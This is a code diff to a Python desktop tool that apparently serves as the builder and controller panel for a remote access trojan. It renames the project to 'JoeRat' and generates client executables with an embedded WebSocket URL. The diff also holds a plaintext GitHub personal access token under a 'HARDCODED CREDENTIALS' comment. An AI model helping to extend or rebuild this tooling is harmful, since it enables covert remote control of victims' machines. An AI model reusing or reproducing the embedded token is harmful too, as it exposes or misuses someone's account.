@@ -3197,11 +3197,11 @@ class ViewerWindow(QMainWindow):
         cfg    = self._load_github_build_config()
         
         # --- HARDCODED CREDENTIALS ---
-        repo   = "Lonhaax/monitorjrrrot"
+        repo   = "Lonhaax/JoeRat"
         pat    = "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" # <--- Replace with real token
         # -----------------------------
 
-        exe_name = getattr(self, 'gh_exe_name_input', None) and self.gh_exe_name_input.text().strip() or cfg.get('exe_name', 'CSharpSender').strip()
+        exe_name = getattr(self, 'gh_exe_name_input', None) and self.gh_exe_name_input.text().strip() or cfg.get('exe_name', 'JoeRat').strip()
         
         if hasattr(self, 'build_log_output'):
             self.build_log_output.clear()
@@ -3232,7 +3232,7 @@ class ViewerWindow(QMainWindow):
                     cfg = json.load(f)
             old = cfg.get('github', {})
             cfg['github'] = {
-                'exe_name': (getattr(self, 'gh_exe_name_input', None) and self.gh_exe_name_input.text().strip()) or old.get('exe_name', 'CSharpSender'),
+                'exe_name': (getattr(self, 'gh_exe_name_input', None) and self.gh_exe_name_input.text().strip()) or old.get('exe_name', 'JoeRat'),
             }
             with open(self._viewer_config_path, 'w') as f:
                 json.dump(cfg, f, indent=2)
@@ -3278,7 +3278,7 @@ class ViewerWindow(QMainWindow):
 
             # Build the new BuildConfig.cs
             new_content = (
-                'namespace CSharpSender;\n'
+                'namespace JoeRat;\n'
                 'internal static class BuildConfig\n'
                 '{\n'
                 f'    public const string DefaultWsUrl  = "{self.ws_url}";\n'
@@ -5706,7 +5706,7 @@ class ViewerWindow(QMainWindow):
 
         _gh = self._load_github_build_config()
 
-        self.gh_exe_name_input = QLineEdit(_gh.get('exe_name', 'CSharpSender'))
+        self.gh_exe_name_input = QLineEdit(_gh.get('exe_name', 'JoeRat'))
         self.gh_exe_name_input.setPlaceholderText('e.g. RatClient')
         self.gh_exe_name_input.setToolTip('The generated executable will have this exact name (without .exe)')
         build_form.addRow('Exe Name:', self.gh_exe_name_input)
@@ -6409,7 +6409,7 @@ class ViewerWindow(QMainWindow):
             csproj_path = None
             for root, dirs, files in os.walk(temp_dir):
                 for f in files:
-                    if f == 'CSharpSender.csproj':
+                    if f == 'JoeRat.csproj':
                         csproj_path = os.path.join(root, f)
                         break
                 if csproj_path:
@@ -6421,7 +6421,7 @@ class ViewerWindow(QMainWindow):
             csproj_path = None
             for root, dirs, files in os.walk(temp_dir):
                 for f in files:
-                    if f == 'CSharpSender.csproj':
+                    if f == 'JoeRat.csproj':
                         csproj_path = os.path.join(root, f)
                         break
                 if csproj_path:
